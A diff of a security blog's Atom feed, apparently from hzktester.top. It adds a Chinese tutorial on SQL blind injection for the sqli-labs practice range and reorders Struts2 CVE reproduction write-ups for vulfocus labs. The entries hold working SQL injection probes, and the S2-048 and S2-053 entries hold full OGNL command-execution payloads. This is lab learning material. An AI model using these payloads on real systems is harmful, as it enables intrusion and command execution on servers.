@@ -6,7 +6,7 @@
   <link href="https://hzktester.top/atom.xml" rel="self"/>
   
   <link href="https://hzktester.top/"/>
-  <updated>2020-09-23T05:13:45.972Z</updated>
+  <updated>2020-09-23T08:58:06.023Z</updated>
   <id>https://hzktester.top/</id>
   
   <author>
@@ -15,6 +15,54 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli-labs-Background-2 盲注</title>
+    <link href="https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/"/>
+    <id>https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/</id>
+    <published>2020-09-23T08:51:00.000Z</published>
+    <updated>2020-09-23T08:58:06.023Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h2><blockquote><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p></blockquote><p>从background-1 中，我们可以知道盲注分为三类 <strong>基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注</strong>。</p><h2 id="基于布尔SQL盲注——构造逻辑判断"><a href="#基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="基于布尔SQL盲注——构造逻辑判断"></a>基于布尔SQL盲注——构造逻辑判断</h2><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>此函数为截取字符串一部分。<strong>MID(column_name,start[,length])</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td></tr></tbody></table><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MID(DATABASE(),1,1)&gt;’a’     &#x2F;&#x2F;数据库名第一位</span><br><span class="line">MID(DATABASE(),2,1)         &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure><p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure><p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p><h3 id="substr-函数和substring-函数"><a href="#substr-函数和substring-函数" class="headerlink" title="substr()函数和substring()函数"></a>substr()函数和substring()函数</h3><p><strong>Substr()</strong> 和 <strong>substring()</strong> 函数实现的功能是一样的，均为截取字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string substring(string, start, length)</span><br><span class="line">string substr(string, start, length)</span><br></pre></td></tr></table></figure><p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(DATABASE(),1,1)&gt;’a’  &#x2F;&#x2F;数据库名第一位</span><br><span class="line">substr(DATABASE(),2,1)      &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure><p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure><p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p><h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p><strong>Left()</strong> 得到字符串左部指定个数的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(string,n)        &#x2F;&#x2F;string为要截取的字符串，n为长度。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure><p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p><p>同样的，string可以为自行构造的SQL语句</p><h3 id="ORD-函数和ascii-函数"><a href="#ORD-函数和ascii-函数" class="headerlink" title="ORD()函数和ascii()函数"></a>ORD()函数和ascii()函数</h3><p>返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID(DATABASE(),1,1))&gt;114</span><br><span class="line">ascii(MID(DATABASE(),1,1))&gt;114</span><br></pre></td></tr></table></figure><p>意为检测<strong>database()</strong> 的第一位<strong>ASCII</strong>码是否大于114，也即是‘r’</p><h3 id="regexp-函数"><a href="#regexp-函数" class="headerlink" title="regexp()函数"></a>regexp()函数</h3><p>正则注入此处不做详解可参考文章<br><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">https://www.cnblogs.com/lcamry/articles/5717442.html</a></p><h2 id="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h2><p><a href="https://bugs.mysql.com/bug.php?id=8652">mysql-bug #8652</a></p><p>BUG #8652的主要内容就是在同时使用<strong>RAND()**函数，聚集函数</strong>COUNT()<strong>和</strong>GROUP BY**子句进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息</p><p>详细原理可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p><h2 id="基于时间的SQL盲注——延时注入"><a href="#基于时间的SQL盲注——延时注入" class="headerlink" title="基于时间的SQL盲注——延时注入"></a>基于时间的SQL盲注——延时注入</h2><p>使用sleep()函数<br>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure><p>if判断语句，条件为假，执行sleep</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version, 1, 1),&#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br></pre></td></tr></table></figure><p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;什么是盲注？&quot;&gt;&lt;a href=&quot;#什么是盲注？&quot; class=&quot;headerlink&quot; title=&quot;什么是盲注？&quot;&gt;&lt;/a&gt;什么是盲注？&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显&lt;br&gt;到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;从background-1 中，我们可以知道盲注分为三类 &lt;strong&gt;基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注&lt;/strong&gt;。&lt;/p&gt;
+&lt;h2 id=&quot;基于布尔SQL盲注——构造逻辑判断&quot;&gt;&lt;a href=&quot;#基于布尔SQL盲注——构造逻辑判断&quot; class=&quot;headerlink&quot; title=&quot;基于布尔SQL盲注——构造逻辑判断&quot;&gt;&lt;/a&gt;基于布尔SQL盲注——构造逻辑判断&lt;/h2&gt;&lt;h3 id=&quot;mid-函数&quot;&gt;&lt;a href=&quot;#mid-函数&quot; class=&quot;headerlink&quot; title=&quot;mid()函数&quot;&gt;&lt;/a&gt;mid()函数&lt;/h3&gt;&lt;p&gt;此函数为截取字符串一部分。&lt;strong&gt;MID(column_name,start[,length])&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;参数&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;column_name&lt;/td&gt;
+&lt;td&gt;必需。要提取字符的字段&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;start&lt;/td&gt;
+&lt;td&gt;必需。规定开始位置（起始值是 1）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;length&lt;/td&gt;
+&lt;td&gt;可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;示例：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MID(DATABASE(),1,1)&amp;gt;’a’     &amp;#x2F;&amp;#x2F;数据库名第一位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MID(DATABASE(),2,1)         &amp;#x2F;&amp;#x2F;数据库名第二位&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看数据库名第一位的&lt;strong&gt;ASCII&lt;/strong&gt;值是否大于a。返回true或flase&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
   
   <entry>
     <title>sqli-labs靶场Less-1-4</title>
@@ -227,28 +275,6 @@
   </entry>
   
   <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-21T12:03:19.250Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li><li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.0 - 2.3.15.1&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
     <title>S2-029 CVE-2016-0785复现过程</title>
     <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
     <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
@@ -259,28 +285,6 @@
     
     
     <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-21T12:03:45.189Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
     
     
     
@@ -314,17 +318,39 @@
   </entry>
   
   <entry>
-    <title>S2-053 CVE-2017-12611复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-019 CVE-2013-4316复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-21T12:03:39.062Z</updated>
+    <updated>2020-09-21T12:03:19.250Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li><li>利用POC</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li></ol>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li><li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li></ol>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.0 - 2.3.15.1&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-21T12:03:45.189Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
     
     
     
@@ -347,6 +373,28 @@
     
     <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。&lt;/p&gt;
 &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.1.2 - Struts 2.3.33&lt;br&gt;Struts 2.5 - Struts 2.5.12&lt;/p&gt;</summary>
+    
+    
+    
